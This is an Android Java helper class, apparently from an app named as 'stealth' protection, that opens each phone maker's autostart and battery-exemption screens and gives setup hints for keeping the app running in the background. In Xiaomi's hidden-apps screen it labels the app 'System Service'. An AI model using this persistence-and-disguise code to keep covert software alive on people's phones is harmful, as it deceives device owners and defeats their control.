package com.seguranca.protecao.stealth;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

/**
 * OemHelper — direct ComponentName targets for every major OEM's
 * background-kill and battery-restriction settings screens.
 *
 * MIUI/HyperOS, Samsung One UI, Huawei/Honor EMUI, Oppo/Realme/OnePlus
 * ColorOS, Vivo FuntouchOS, Infinix/Tecno/Itel PhoneMaster all ship
 * proprietary kill-switches that bypass AlarmManager, JobScheduler,
 * and every standard Android persistence layer. This class opens each
 * OEM's exact screen so setup can acquire the exemptions at first run.
 *
 * Call openAutoStartSettings() and openBatterySettings() from
 * SetupWizardActivity during the permission grant flow.
 */
public final class OemHelper {

    private static final String TAG = "OemHelper";

    private OemHelper() {}

    // ── Manufacturer detection ─────────────────────────────────────────────────

    public static String getManufacturer() {
        return Build.MANUFACTURER.toLowerCase();
    }

    public static boolean isXiaomi() {
        String m = getManufacturer();
        return m.contains("xiaomi") || m.contains("redmi") || m.contains("poco");
    }

    public static boolean isSamsung() {
        return getManufacturer().contains("samsung");
    }

    public static boolean isHuawei() {
        String m = getManufacturer();
        return m.contains("huawei") || m.contains("honor");
    }

    public static boolean isOppo() {
        String m = getManufacturer();
        return m.contains("oppo") || m.contains("realme") || m.contains("oneplus");
    }

    public static boolean isVivo() {
        return getManufacturer().contains("vivo");
    }

    public static boolean isInfinix() {
        String m = getManufacturer();
        return m.contains("infinix") || m.contains("tecno") || m.contains("itel");
    }

    // ── Autostart settings ─────────────────────────────────────────────────────

    /**
     * Opens the OEM-specific autostart management screen directly.
     * Falls back to app details if the OEM screen is unavailable.
     */
    public static void openAutoStartSettings(Context ctx) {
        try {
            Intent i = buildAutoStartIntent(ctx);
            if (i != null) {
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
                Log.d(TAG, "Opened autostart settings for: " + getBrandName());
            } else {
                openAppDetails(ctx);
            }
        } catch (Exception e) {
            Log.w(TAG, "openAutoStartSettings failed: " + e.getMessage());
            openAppDetails(ctx);
        }
    }

    private static Intent buildAutoStartIntent(Context ctx) {
        if (isXiaomi()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.miui.securitycenter",
                "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            return i;
        }
        if (isSamsung()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.samsung.android.sm",
                "com.samsung.android.sm.app.dashboard.SmartManagerDashBoardActivity"));
            return i;
        }
        if (isHuawei()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.huawei.systemmanager",
                "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"));
            return i;
        }
        if (isOppo()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.coloros.safecenter",
                "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            return i;
        }
        if (isVivo()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.vivo.permissionmanager",
                "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            return i;
        }
        if (isInfinix()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.transsion.phonemaster",
                "com.cyin.himgr.autostart.AutoStartActivity"));
            return i;
        }
        return null;
    }

    // ── Battery restriction settings ────────────────────────────────────────────

    /**
     * Opens the OEM-specific battery optimisation / unrestricted-background
     * screen directly. Falls back to app details if unavailable.
     */
    public static void openBatterySettings(Context ctx) {
        try {
            Intent i = buildBatteryIntent(ctx);
            if (i != null) {
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
                Log.d(TAG, "Opened battery settings for: " + getBrandName());
            } else {
                // Standard system battery optimisation screen
                Intent std = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                std.setData(Uri.parse("package:" + ctx.getPackageName()));
                std.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(std);
            }
        } catch (Exception e) {
            Log.w(TAG, "openBatterySettings failed: " + e.getMessage());
            openAppDetails(ctx);
        }
    }

    private static Intent buildBatteryIntent(Context ctx) {
        if (isXiaomi()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.miui.powerkeeper",
                "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"));
            i.putExtra("package_name", ctx.getPackageName());
            i.putExtra("package_label", "System Service");
            return i;
        }
        if (isSamsung()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.samsung.android.lool",
                "com.samsung.android.sm.ui.battery.BatteryActivity"));
            return i;
        }
        if (isHuawei()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.huawei.systemmanager",
                "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            return i;
        }
        if (isOppo()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.coloros.safecenter",
                "com.coloros.safecenter.permission.PermissionManagerActivity"));
            return i;
        }
        if (isVivo()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.vivo.permissionmanager",
                "com.vivo.permissionmanager.activity.PurviewTabActivity"));
            return i;
        }
        if (isInfinix()) {
            Intent i = new Intent();
            i.setComponent(new ComponentName(
                "com.transsion.phonemaster",
                "com.cyin.himgr.battprot.BattProtActivity"));
            return i;
        }
        return null;
    }

    // ── Fallback ───────────────────────────────────────────────────────────────

    public static void openAppDetails(Context ctx) {
        try {
            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    // ── Info helpers ────────────────────────────────────────────────────────────

    public static String getBrandName() {
        if (isXiaomi())  return "Xiaomi / MIUI / HyperOS";
        if (isSamsung()) return "Samsung One UI";
        if (isHuawei())  return "Huawei / Honor EMUI";
        if (isOppo())    return "Oppo / Realme / OnePlus ColorOS";
        if (isVivo())    return "Vivo FuntouchOS";
        if (isInfinix()) return "Infinix / Tecno / Itel";
        return "Android " + Build.VERSION.RELEASE + " (" + Build.MANUFACTURER + ")";
    }

    /**
     * Returns OEM-specific instructions to show to the user during
     * the setup flow so they know exactly what to enable.
     */
    public static String getSetupHint() {
        if (isXiaomi())
            return "Xiaomi / MIUI:\n"
                 + "1. Security → Permissions → Autostart → Enable this app\n"
                 + "2. Security → Battery → No restrictions\n"
                 + "3. Settings → Additional settings → Developer options → MIUI Optimization → OFF";
        if (isSamsung())
            return "Samsung One UI:\n"
                 + "1. Settings → Device care → Battery → Background usage limits\n"
                 + "2. Never sleeping apps → Add this app\n"
                 + "3. Settings → Apps → this app → Battery → Unrestricted";
        if (isHuawei())
            return "Huawei / Honor EMUI:\n"
                 + "1. Phone Manager → App launch → this app → Manage manually\n"
                 + "2. Enable: Auto-launch, Secondary launch, Run in background\n"
                 + "3. Battery → Protected apps → Add this app";
        if (isOppo())
            return "Oppo / Realme / OnePlus:\n"
                 + "1. Settings → Battery → Battery optimization → this app → Don't optimize\n"
                 + "2. Security Center → Privacy permissions → Startup manager → Allow";
        if (isVivo())
            return "Vivo:\n"
                 + "1. Settings → Battery → High background power consumption → Allow\n"
                 + "2. iManager → Autostart Manager → Enable this app";
        if (isInfinix())
            return "Infinix / Tecno:\n"
                 + "1. Phone Master → Auto-start Manager → Enable this app\n"
                 + "2. Battery → App management → No restrictions";
        return "Settings → Apps → this app → Battery → Unrestricted";
    }
}
